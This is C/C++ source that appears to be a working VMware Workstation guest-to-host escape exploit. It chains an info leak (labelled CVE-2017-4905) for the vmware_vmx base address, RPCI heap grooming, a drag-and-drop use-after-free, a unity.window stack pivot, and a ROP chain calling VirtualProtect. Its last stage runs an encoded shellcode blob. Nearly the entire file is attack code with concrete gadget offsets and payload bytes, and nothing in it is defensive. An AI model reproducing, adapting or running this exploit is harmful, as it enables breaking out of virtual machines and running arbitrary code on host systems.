#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "backdoor_def.h"
#include "message.h"
#pragma comment(lib,"Ws2_32.lib")
#define RPCI_PROTOCOL_NUM       0x49435052 /* 'RPCI' ;-) */
#define GUEST_RPC_CMD_STR_DND "dnd.transport "
#define GUEST_RPC_CMD_STR_CP  "copypaste.transport "
#define MAX_LFH_BLOCK 512

// target is windows 7

#include <winsdkver.h>
#define _WIN32_WINNT 0x0601
#include <sdkddkver.h>

// Debugging purposes

#include <cstdio>
#include <iostream>
#include <cstdint>
#include <inttypes.h>
#include <iomanip>

// set to release cause debug need msvc dlls, lazy to install on vm

Message_Channel msgchl;
unsigned char *myReply = 0;
size_t myRepLen;

BOOL rpcstart()
{
	return Message_OpenAllocated(RPCI_PROTOCOL_NUM, &msgchl, 0, 0);
}

Bool rpcstop()
{
	return Message_CloseAllocated(&msgchl);
}

BOOL rpcsend(char *inbuf, size_t inlen, unsigned char**outbuf, size_t *outlen)
{
	size_t temp;
	if (!outlen)
	{
		outlen = &temp;
	}
	if (Message_Send(&msgchl, (const unsigned char*)inbuf, inlen) == FALSE) 
	{
		return FALSE;
	}
	if (Message_Receive(&msgchl, outbuf, outlen) == FALSE) 
	{
		return FALSE;
	}
	if (!*outbuf && !*outlen)
	{
		return TRUE;
	}
	if (*outlen < 2 || ((strncmp((const char *)*outbuf, "1 ", 2) == 0) == FALSE && strncmp((const char *)outbuf, "0 ", 2))) 
	{
		return FALSE;
	}
	*outlen -= 2;
	*outbuf += 2;
	return TRUE;
}

char *enumerate_uninitialized_buffer(const void *haystack, size_t haystack_len, const void * const needle, const size_t needle_len)
{
	if (haystack == NULL) return NULL; // or assert(haystack != NULL);
	if (haystack_len == 0) return NULL;
	if (needle == NULL) return NULL; // or assert(needle != NULL);
	if (needle_len == 0) return NULL;

	for (char *h = (char*)haystack; haystack_len >= needle_len; ++h, --haystack_len) {
		if (memcmp(h, needle, needle_len) == 0) {
			char* temp = h - 5;
			int lsb_8 = static_cast<int>(static_cast<unsigned char>(temp[0]));
			int lsb_7 = static_cast<int>(static_cast<unsigned char>(temp[1]));
			int lsb_6 = static_cast<int>(static_cast<unsigned char>(temp[2]));
			int lsb_5 = static_cast<int>(static_cast<unsigned char>(temp[3]));
			int lsb_4 = static_cast<int>(static_cast<unsigned char>(temp[4]));
			int lsb_3 = static_cast<int>(static_cast<unsigned char>(temp[5]));
			int lsb_2 = static_cast<int>(static_cast<unsigned char>(temp[6]));
			int lsb_1 = static_cast<int>(static_cast<unsigned char>(temp[7]));

			bool doPrint = false;

			if ((lsb_8 == 0x68) && (lsb_7 == 0x6b)) {
				doPrint = true;
			}
			else if ((lsb_8 == 0xfa) && (lsb_7 == 0x86)) {
				doPrint = true;
			}
			else if ((lsb_8 == 0x10) && (lsb_7 == 0xef)) {
				doPrint = true;
			}
			else if ((lsb_8 == 0x42) && (lsb_7 == 0xe3)) {
				doPrint = true;
			}
			else if ((lsb_8 == 0x48) && (lsb_7 == 0x24)) {
				doPrint = true;
			}
			else if ((lsb_8 == 0x98) && (lsb_7 == 0x1b)) {
				doPrint = true;
			}
			else if ((lsb_8 == 0x19) && (lsb_7 == 0xef)) {
				doPrint = true;
			}
			else if ((lsb_8 == 0x48) && (lsb_7 == 0x24)) {
				doPrint = true;
			}
			else if ((lsb_8 == 0x18) && (lsb_7 == 0xef)) {
				doPrint = true;
			}
			else if ((lsb_8 == 0x39) && (lsb_7 == 0xae)) {
				doPrint = true;
			}

			if (doPrint) {
				printf("Dumping possible vmware_vmx.exe leak: 0x%x%x%x%x%x%x%x%x\n", lsb_1, lsb_2, lsb_3, lsb_4, lsb_5, lsb_6, lsb_7, lsb_8);
				return h;
			}
		}
	}
	return NULL;
}

uint64 triggerCve_2017_4905()
{
	uint64 leaked = 0xffffffffffffffff;
	while (true)
	{
		leaked = 0xffffffffffffffff;
		char *buf = (char *)infoleak();
		char *ptr = buf;
		bool iFoundSomething = true;

		ptr = enumerate_uninitialized_buffer(ptr, 0x8000, "\x7f\x00\x00", 3);

		if (ptr) {
			uint64 store = 0;
			memcpy(&store, ptr - 5, 8);
			unsigned int temp = store & 0xffff;

			if (temp == 0x6b68)
			{
				leaked = store - 0x00876b68;
				break;
			}
			else if (temp == 0x86fa)
			{
				leaked = store - 0x005786fa;
				break;
			}
			else if (temp == 0xef10)
			{
				leaked = store - 0x0085ef10;
				break;
			}

			else if (temp == 0xe342)
			{
				leaked = store - 0x0057e342;
				break;
			}
			else if (temp == 0x2448)
			{
				leaked = store - 0x00902448;
				break;
			}
			else if (temp == 0x1b98)
			{
				leaked = store - 0x007b1b98;
				break;
			}

			else if (temp == 0xef19)
			{
				leaked = store - 0x0057e342;
				break;
			}
			else if (temp == 0xef18)
			{
				leaked = store - 0x0085ef18;
				break;
			}
			else if (temp == 0xae39)
			{
				leaked = store - 0x0047ae39;
				break;
			}
			else
			{
				continue;
			}
		}
	}
	return leaked;
}

uint64* generateRop(uint64 base_address) {

	uint64 rop[100] = { 0 };
	
	/*
	rop[0] = base_address + 0x3ed3de; // 0x1403ed3de: pop rbp ; ret  ;  (1 found)
	rop[1] = base_address + 0xB30000; // rando RW pointer // .data section
	rop[2] = base_address + 0x1a8e83; // 0x1401a8e83: push rsp ; pop rbx ; add byte [rbp-0x00C08B40], al ; ret  ;  (1 found) -> rbx: rsp
	rop[3] = base_address + 0x485c01; // 0x140485c01: mov rax, rbx ; add rsp, 0x10 ; pop rbx ; ret  ;  (1 found) -> rax: rsp
	rop[4] = 0xdeadbeef;
	rop[5] = 0xdeadbeef;
	rop[6] = base_address + 0xB30000; // rando RW pointer
	rop[7] = base_address + 0x3f49eb; // 0x1403f49eb: xchg rax, r10 ; add byte [rbx+0x5C8B48C3], cl ; and al, 0x30 ; add rsp, 0x20 ; pop rdi ; ret  ;  (1 found) -> r10: rsp
	rop[8] = 0xdeadbeef;
	rop[9] = 0xdeadbeef;
	rop[10] = 0xdeadbeef;
	rop[11] = 0xdeadbeef;
	rop[12] = 0xdeadbeef;
	rop[13] = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found) 
	rop[14] = base_address + 0xB30000; // rando pointer
	rop[15] = base_address + 0x71cb1d; // 0x14071cb1d: pop rdx ; ret  ;  (1 found)
	rop[16] = 0xcafebabe; // need to see
	rop[17] = base_address + 0x61b60f; // 0x14061b60f: add r10, rdx ; mov qword [rax], r10 ; mov eax, ebx ; mov rbx, qword [rsp+0x30] ; add rsp, 0x28 ; ret  ;  (1 found) -> r10: shellcode
	rop[18] = 0xdeadbeef;
	rop[19] = 0xdeadbeef;
	rop[20] = 0xdeadbeef;
	rop[21] = 0xdeadbeef;
	rop[22] = 0xdeadbeef;

	rop[23] = base_address + 0x168122; // 0x140168122: pop rdx ; ret  ;  (1 found) dwSize 0x1000
	rop[24] = 0x1000;

	rop[25] = base_address + 0x647265; // 0x140647265: pop r8 ; ret  ;  (1 found) flNewProtect 0x40
	rop[26] = 0x40;

	rop[27] = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found)
	rop[28] = base_address + 0xB30000; // rando RW pointer
	rop[29] = base_address + 0x50ef0d; // 0x14050ef0d: pop r9 ; cmp al, byte [rax] ; ret  ;  (1 found)
	rop[30] = base_address + 0xB30000; // rando RW pointer

	rop[31] = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found)
	rop[32] = base_address + 0x75da68; // VirtualProtect IAT
	rop[33] = base_address + 0x3a39f7; // 0x1403a39f7: mov rax, qword [rax] ; ret  ;  (1 found)

	rop[34] = base_address + 0x66eeb9;// 0x14066eeb9: mov rcx, r10 ; add rsp, 0x30 ; pop rbx ; jmp rax ;  (1 found) -> rcx: shellcode
	rop[35] = 0xdeadbeef;
	rop[36] = 0xdeadbeef;
	rop[37] = 0xdeadbeef;
	rop[38] = 0xdeadbeef;
	rop[39] = 0xdeadbeef;
	rop[40] = 0xdeadbeef;
	rop[41] = 0xdeadbeef;
	rop[42] = 0x90909090;
	rop[43] = 0xcccccccc;
	rop[44] = 0x90909090;
	*/

	rop[0] = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found) 
	rop[1] = base_address + 0xb870f8 + 0x20;
	rop[2] = base_address + 0x03b8dcd; // 0x1403b8dcd: mov rcx, qword [rax] ; mov rax, qword [rax+0x08] ; add rax, rcx ; ret  ;  (1 found)

	rop[3] = base_address + 0x168122; // 0x140168122: pop rdx ; ret  ;  (1 found) dwSize 0x1000
	rop[4] = 0x1000;

	rop[5] = base_address + 0x647265; // 0x140647265: pop r8 ; ret  ;  (1 found) flNewProtect 0x40
	rop[6] = 0x40;

	rop[7] = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found) 
	rop[8] = base_address + 0xB30000; // rando RW pointer
	rop[9] = base_address + 0x50ef0d; // 0x14050ef0d: pop r9 ; cmp al, byte [rax] ; ret  ;  (1 found)
	rop[10] = base_address + 0xB30000; // rando RW pointer

	rop[11] = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found) 
	rop[12] = base_address + 0x75da68; // VirtualProtect IAT
	rop[13] = base_address + 0x3a39f7; // 0x1403a39f7: mov rax, qword [rax] ; ret  ;  (1 found)

	rop[14] = base_address + 0x7525a0;// 0x1407525a0: jmp rax ;  (1 found)
	rop[15] = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found) 
	rop[16] = base_address + 0xb870f8 + 0x20;
	rop[17] = base_address + 0x3a39f7; // 0x1403a39f7: mov rax, qword [rax] ; ret  ;  (1 found)
	rop[18] = base_address + 0x921c; // 0x14000921c: push rax ; ret  ;  (1 found)
	rop[19] = 0xdeadbeef;
	rop[20] = 0xdeadbeef;
	rop[21] = 0xdeadbeef;
	rop[22] = 0xdeadbeef;
	rop[23] = 0xdeadbeef;
	rop[24] = 0xdeadbeef;

	return rop;

}

/*
tools.capability.dnd_version 2
vmx.capability.dnd_version
tools.capability.dnd_version 3
vmx.capability.dnd_version
dnd.setGuestFileRoot AAAAA //Technically any DnD function would work.
*/
void controlAllocation(int space, char toFill)
{
	char* string_to_send;
	char* result = new char[space + 1];
	for (int i = 0; i < space; ++i) {
		result[i] = toFill;
	}
	result[space] = '\0';
	char* firstString = "tools.capability.guest_temp_directory ";
	int totalLength = strlen(firstString) + strlen(result) + 1;
	char* combinedString = new char[totalLength];
	strcpy(combinedString, firstString);
	strcat(combinedString, result);

	string_to_send = combinedString;
	printf("Allocating: '%s' using %s\n", string_to_send, firstString);
	rpcsend(string_to_send, strlen(string_to_send), &myReply, &myRepLen);
}

void controlAllocationWithNullBytes(int space)
{
	Message_Channel *channel = Message_Open(RPCI_PROTOCOL_NUM);

	char result[0x100];

	for (int i = 0; i < space; i+=8) {
		memcpy(result+i, "\x00\x00\x00\x00", 4);
		memcpy(result+4+i, "\x41\x41\x41\x41", 4);
	}

	int total_size = space + 38;

	/*
	I'm guessing that we need to construct our own Message_SendSize and Message_SendData functions
	from the given code in open-vm-tools.
	*/

	Message_SendSize(channel, space); // Send payload size
	Message_SendHigh(channel, (const unsigned char*)result, 0xa8); // ihni why is it 0xa8, does not make sense to me
	Message_Close(channel);
}

void controlAllocationWithNullBytesUseStackPivot(int space, uint64 gadget)
{
	Message_Channel *channel = Message_Open(RPCI_PROTOCOL_NUM);

	char result[0x100];

	for (int i = 0; i < space; i += 8) {
		memcpy(result + i, &gadget, 8);
	}

	int total_size = space + 38;

	/*
	I'm guessing that we need to construct our own Message_SendSize and Message_SendData functions
	from the given code in open-vm-tools.
	*/

	Message_SendSize(channel, space); // Send payload size
	Message_SendHigh(channel, (const unsigned char*)result, 0xa8); // ihni why is it 0xa8, does not make sense to me
	Message_Close(channel);
}

// funnily, though we cannot control allocation, rdi has not only our "BBBB"s but also the "AAAA"s 
// and even the nullbytes and the subsequent "CCCC"s allocated by this function, which may indicate 
// that the dnd command can send nullbytes
void controlAllocationWithNullBytesFailPoc(int space, char toFill)
{
	char* firstString = "tools.capability.guest_temp_directory "; // 38
	char* result = new char[38 + space + 0x20];

	int lastValue = 0;
	for (int i = 0; i < strlen(firstString); ++i) {
		result[i] = firstString[i];
		lastValue = i;
	}

	result[lastValue + 1] = '\x41';
	result[lastValue + 2] = '\x41';
	result[lastValue + 3] = '\x41';
	result[lastValue + 4] = '\x41';

	result[lastValue + 5] = '\x00';
	result[lastValue + 6] = '\x00';
	result[lastValue + 7] = '\x00';
	result[lastValue + 8] = '\x00';

	for (int i = 0; i < space; ++i) {
		result[lastValue+8+1+i] = 'C';
	}

	printf("Allocating: '%s' using %s\n", result, firstString);
	rpcsend(result, space+38, &myReply, &myRepLen);
}

void useInTheUseAfterFree(){
	char* string_to_send;
	string_to_send = "dnd.setGuestFileRoot BBBBBBBBBB"; // triggers the uaf // Can put ROP chain here :)
	rpcsend(string_to_send, strlen(string_to_send), &myReply, &myRepLen);
}

void useInTheUseAfterFreeWithNullBytes(){
	char* firstString = "dnd.setGuestFileRoot "; // 21
	char* result = new char[21 + 0x500];

	int lastValue = 0;
	for (int i = 0; i < strlen(firstString); ++i) {
		result[i] = firstString[i];
		lastValue = i;
	}

	result[lastValue + 1] = '\x45';
	result[lastValue + 2] = '\x45';
	result[lastValue + 3] = '\x45';
	result[lastValue + 4] = '\x45';

	result[lastValue + 5] = '\x00';
	result[lastValue + 6] = '\x00';
	result[lastValue + 7] = '\x00';
	result[lastValue + 8] = '\x00';

	for (int i = 0; i < 0x400; ++i) {
		result[lastValue + 8 + 1 + i] = 'Z';
	}

	printf("Allocating: '%s' using %s\n", result, firstString);
	rpcsend(result, 8 + 1 + 21 + 0x400, &myReply, &myRepLen);
}

void useInTheUseAfterFreeWithNullBytesAndRopStorage(uint64* ropChain, int ropChainNumber, uint64 base_address){
	char* firstString = "dnd.setGuestFileRoot "; // 21
	char* result = new char[0x300];

	int lastValue = strlen(firstString);
	memcpy(result, firstString, strlen(firstString));

	uint64 temp = 0;

	temp = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found) 
	memcpy(result + lastValue + 8 * 0, &temp, 8);

	temp = base_address + 0xb870f8 + 0x20;
	memcpy(result + lastValue + 8 * 1, &temp, 8);
	
	temp = base_address + 0x03b8dcd; // 0x1403b8dcd: mov rcx, qword [rax] ; mov rax, qword [rax+0x08] ; add rax, rcx ; ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 2, &temp, 8);

	temp = base_address + 0x168122; // 0x140168122: pop rdx ; ret  ;  (1 found) dwSize 0x1000
	memcpy(result + lastValue + 8 * 3, &temp, 8);
	temp = 0x1000;
	memcpy(result + lastValue + 8 * 4, &temp, 8);

	temp = base_address + 0x647265; // 0x140647265: pop r8 ; ret  ;  (1 found) flNewProtect 0x40
	memcpy(result + lastValue + 8 * 5, &temp, 8);
	temp = 0x40;
	memcpy(result + lastValue + 8 * 6, &temp, 8);

	temp = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found) 
	memcpy(result + lastValue + 8 * 7, &temp, 8);
	temp = base_address + 0xB30000; // rando RW pointer
	memcpy(result + lastValue + 8 * 8, &temp, 8);
	temp = base_address + 0x50ef0d; // 0x14050ef0d: pop r9 ; cmp al, byte [rax] ; ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 9, &temp, 8);
	temp = base_address + 0xB30000; // rando RW pointer
	memcpy(result + lastValue + 8 * 10, &temp, 8);

	temp = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found) 
	memcpy(result + lastValue + 8 * 11, &temp, 8);
	temp = base_address + 0x75d6A8; // VirtualProtect IAT
	memcpy(result + lastValue + 8 * 12, &temp, 8);
	temp = base_address + 0x3a39f7; // 0x1403a39f7: mov rax, qword [rax] ; ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 13, &temp, 8);

	temp = base_address + 0x7525a0;// 0x1407525a0: jmp rax ;  (1 found)
	memcpy(result + lastValue + 8 * 14, &temp, 8);
	temp = base_address + 0x474724; // 0x140474724: add rsp, 0x20 ; pop r12 ; pop rbp ; pop rbx ; ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 15, &temp, 8);

	temp = base_address + 0xe4662; // shadow space // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 16, &temp, 8);
	temp = base_address + 0xe4662; // shadow space // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 17, &temp, 8);
	temp = base_address + 0xe4662; // shadow space // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 18, &temp, 8);
	temp = base_address + 0xe4662; // shadow space // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 19, &temp, 8);
	temp = base_address + 0xe4662; // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 20, &temp, 8);
	temp = base_address + 0xe4662; // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 21, &temp, 8);
	temp = base_address + 0xe4662; // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 22, &temp, 8);
	temp = base_address + 0xe4662; // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 23, &temp, 8);
	temp = base_address + 0xe4662; // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 24, &temp, 8);
	temp = base_address + 0xe4662; // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 25, &temp, 8);
	temp = base_address + 0xe4662; // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 26, &temp, 8);
	temp = base_address + 0xe4662; // 0x1400e4662: ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 27, &temp, 8);

	temp = base_address + 0x14e5b; // 0x140014e5b: pop rax ; ret  ;  (1 found) 
	memcpy(result + lastValue + 8 * 28, &temp, 8);

	temp = base_address + 0xb870f8 + 0x20;
	memcpy(result + lastValue + 8 * 29, &temp, 8);
	
	temp = base_address + 0x3a39f7; // 0x1403a39f7: mov rax, qword [rax] ; ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 30, &temp, 8);
	
	temp = base_address + 0x921c; // 0x14000921c: push rax ; ret  ;  (1 found)
	memcpy(result + lastValue + 8 * 31, &temp, 8);

	/*
	for (int i = 0; i < ropChainNumber; i++) {
		uint64 temp = ropChain[i];
		memcpy(result + lastValue + 1 + i * 8, &temp, 8);
	}
	*/

	printf("[$] Allocating: '%s' using %s\n", result, firstString);
	rpcsend(result, 0x300, &myReply, &myRepLen);
}

void unityWindowContentsStartToSetStackPivot(__int64 gadget)
{
	unsigned char *myReply = 0;
	size_t myRepLen;

	u_long low = gadget & 0xffffffff, nlow = 0;
	u_long high = (gadget >> 32), nhigh = 0;;

	nlow = htonl(low);
	nhigh = htonl(high);

	char tmp[0x100];
	RtlSecureZeroMemory(tmp, 0x100);

	memcpy(tmp, "unity.window.contents.start \x00\x00\x00\x01\x00\x00\x00\x01\xde\xad\xbe\xef", 40);
	memcpy(tmp + 40, &nlow, 4);
	memcpy(tmp + 44, &nhigh, 4);
	memcpy(tmp + 48, "\x00\x00\x05\x00", 4);

	if (!rpcsend(tmp, 52, &myReply, &myRepLen)) {
		puts((char*)myReply);
	}	
	else {
		printf("[?] Sent unity.window.contents.start Check vmware_vmx+0xb870f8 for a surprise :)\n");
	}
}

void unityWindowContentsChunkToSetPayload(unsigned char *payload, int payloadSize)
{
	int rounded_size = payloadSize;
	if (payloadSize % 4 != 0) {
		rounded_size += (4 - (payloadSize % 4));
	}

	uint32 chunkIdPointer[2];

	int chunkId = 0;
	char tmp[0x500];
	RtlSecureZeroMemory(tmp, 0x500);
	memcpy(tmp, "unity.window.contents.chunk \x00\x00\x00\x01\x00\x00\x00\x01\xde\xad\xbe\xef", 40);

	u_long chunkIdStore = htonl(chunkId);
	u_long roundedSizeStore = htonl(rounded_size);

	memcpy(tmp + 40, &chunkIdStore, 4);
	memcpy(tmp + 44, &roundedSizeStore, 4);
	memcpy(tmp + 48, payload, payloadSize);

	if (!rpcsend(tmp, 48 + rounded_size, &myReply, &myRepLen))
	{
		puts((char*)myReply);
	}
	else
	{
		printf("[@] Sent unity.window.contents.chunk Check vmware_vmx+0xb870f8 for a surprise :)\n");
	}
	chunkId++;
	return;
}

void triggerUndisclosedCvePwnToOwn2017(uint64* ropChain, uint64 base)
{
	char* string_to_send;
	string_to_send = "vmx.capability.copypaste_version";
	printf("[ ] Testing Vmware Backdoor via copypaste_version, should return 4 as per https://www.zerodayinitiative.com/blog/2018/1/19/automating-vmware-rpc-request-sniffing\n");
	if (!rpcsend(string_to_send, strlen(string_to_send), &myReply, &myRepLen))
	{
		printf("[w] Error sending \"%s\":%s\n", string_to_send, (char*)myReply);
		return;
	}
	else
	{
		printf("[#] Reply (should be 4): %s\n", (char*)myReply);
	}
	printf("[?] Ready to crash this shit?\n");
	int debug;
	scanf_s("&d", &debug);

	string_to_send = "tools.capability.dnd_version 2";
	rpcsend(string_to_send, strlen(string_to_send), &myReply, &myRepLen);

	string_to_send = "vmx.capability.dnd_version";
	rpcsend(string_to_send, strlen(string_to_send), &myReply, &myRepLen);

	string_to_send = "tools.capability.dnd_version 3";
	rpcsend(string_to_send, strlen(string_to_send), &myReply, &myRepLen);

	string_to_send = "vmx.capability.dnd_version";
	rpcsend(string_to_send, strlen(string_to_send), &myReply, &myRepLen);

	uint64 pointerToStackPivot = base + 0xb870f8;

	for (int i = 0; i < 0x40; i++) {
		//controlAllocation(0xb8, 'A'); // failed
		//controlAllocation(0xb8-0x8, 'A'); // worked: account for 8 byte NULL terminator
		//controlAllocationWithNullBytesFailPoc(0xb8 - 0x8, 'A'); // fail allocation using null bytes (but stored in RDI)
		//controlAllocationWithNullBytes(0xb8-0x8); // worked + can use null bytes
		controlAllocationWithNullBytesUseStackPivot(0xb8 - 0x8, pointerToStackPivot); // no need to add +0x8 cause we are going to call [rax+8] hence we will nicely call [base + 0xb87100]
	}

	printf("[2] Using controlAllocationWithNullBytesUseStackPivot() for UaF allocation\n");
	printf("[3] Using useInTheUseAfterFreeWithNullBytesAndRopStorage() for UaF ROP Storage Allocation\n");

	//useInTheUseAfterFreeWithNullBytes();
	useInTheUseAfterFreeWithNullBytesAndRopStorage(ropChain, 50, base);
}

void debug(char* debug_string) {
	printf("%s\n", debug_string);
	int debug;
	scanf_s("&d", &debug);
}

void setStackPivotAndShellcode(uint64 base) {
	unityWindowContentsStartToSetStackPivot(base + 0x1832a1);

	unsigned char payload[] =
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\xe1\x3b\xdf\x5c\x6e\xec\x8f\xe8\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x1d\x73\x5c"
		"\xb8\x9e\x04\x4f\xe8\xe1\x3b\x9e\x0d\x2f\xbc\xdd\xb9\xb7"
		"\x73\xee\x8e\x0b\xa4\x04\xba\x81\x73\x54\x0e\x76\xa4\x04"
		"\xba\xc1\x73\x54\x2e\x3e\xa4\x80\x5f\xab\x71\x92\x6d\xa7"
		"\xa4\xbe\x28\x4d\x07\xbe\x20\x6c\xc0\xaf\xa9\x20\xf2\xd2"
		"\x1d\x6f\x2d\x6d\x05\xb3\x7a\x8e\x14\xe5\xbe\xaf\x63\xa3"
		"\x07\x97\x5d\xbe\x67\x0f\x60\xe1\x3b\xdf\x14\xeb\x2c\xfb"
		"\x8f\xa9\x3a\x0f\x0c\xe5\xa4\x97\xac\x6a\x7b\xff\x15\x6f"
		"\x3c\x6c\xbe\xa9\xc4\x16\x1d\xe5\xd8\x07\xa0\xe0\xed\x92"
		"\x6d\xa7\xa4\xbe\x28\x4d\x7a\x1e\x95\x63\xad\x8e\x29\xd9"
		"\xdb\xaa\xad\x22\xef\xc3\xcc\xe9\x7e\xe6\x8d\x1b\x34\xd7"
		"\xac\x6a\x7b\xfb\x15\x6f\x3c\xe9\xa9\x6a\x37\x97\x18\xe5"
		"\xac\x93\xa1\xe0\xeb\x9e\xd7\x6a\x64\xc7\xe9\x31\x7a\x87"
		"\x1d\x36\xb2\xd6\xb2\xa0\x63\x9e\x05\x2f\xb6\xc7\x6b\x0d"
		"\x1b\x9e\x0e\x91\x0c\xd7\xa9\xb8\x61\x97\xd7\x7c\x05\xd8"
		"\x17\x1e\xc4\x82\x15\xd0\x9b\xfc\xda\xbe\x08\xed\x5c\x6e"
		"\xad\xd9\xa1\x68\xdd\x97\xdd\x82\x4c\x8e\xe8\xe1\x72\x56"
		"\xb9\x27\x50\x8d\xe8\xe0\x80\x1f\xf4\xbb\x6c\xce\xbc\xa8"
		"\xb2\x3b\x10\xe7\x1d\xce\x52\xad\x4c\xf9\x5b\x91\x39\xc3"
		"\x61\x0b\x53\xde\x5d\x6e\xec\xd6\xa9\x5b\x12\x5f\x37\x6e"
		"\x13\x5a\xb8\xb1\x76\xee\x95\x23\xdd\x4f\xa0\x1e\xfb\x97"
		"\xd5\xac\xa4\x70\x28\xa9\xb2\x1e\x1d\xd4\x06\x80\x37\x01"
		"\xc4\x0a\x14\xe7\x2b\xe5\xf8\xa0\x63\x93\xd5\x8c\xa4\x06"
		"\x11\xa0\x81\x46\xf9\x1a\x8d\x70\x3d\xa9\xba\x1b\x1c\x6c"
		"\xec\x8f\xa1\x59\x58\xb2\x38\x6e\xec\x8f\xe8\xe1\x7a\x8f"
		"\x1d\x3e\xa4\x06\x0a\xb6\x6c\x88\x11\x5f\x2c\xe5\xe5\xb8"
		"\x7a\x8f\xbe\x92\x8a\x48\xac\xc5\x6f\xde\x5d\x26\x61\xcb"
		"\xcc\xf9\xfd\xdf\x34\x26\x65\x69\xbe\xb1\x7a\x8f\x1d\x3e"
		"\xad\xdf\xa1\x1e\xfb\x9e\x0c\x27\x13\x47\xa5\x68\xfa\x93"
		"\xd5\xaf\xad\x35\x91\x2d\x04\x59\xa3\xbb\xa4\xbe\x3a\xa9"
		"\xc4\x15\xd7\x60\xad\x35\xe0\x66\x26\xbf\xa3\xbb\x57\x7f"
		"\x5d\x43\x6d\x9e\xe6\xc8\x79\x32\x75\x1e\xee\x97\xdf\xaa"
		"\xc4\xb3\xee\x9d\x31\x5f\xa7\x8e\x99\x8a\x53\xa6\x28\xad"
		"\x33\x04\xec\xd6\xa9\x68\xe1\x20\x89\x6e\xec\x8f\xe8"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

	unityWindowContentsChunkToSetPayload(payload, 503 + 16 * 4);
}

void main(int argc,char**argv)
{
	printf("[2] Start from scratch, clean everything :)\n");
	uint64 base = triggerCve_2017_4905();
	uint64* ropChain = generateRop(base);
	printf("[!] Base: 0x%llx\n", base);
	__try {
		if (rpcstart() == 1)
		{
			printf("[0] I can connect to RPC\n");
			setStackPivotAndShellcode(base);
			debug("[4] We have set our pivots and shellcode\n");
			triggerUndisclosedCvePwnToOwn2017(ropChain, base);
		}
		else
		{
			printf("[-] I cannot connect to RPC\n");
		}
	}
	__except (GetExceptionInformation() ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
		fprintf(stderr, "[-] Not vm error\n");
	}
}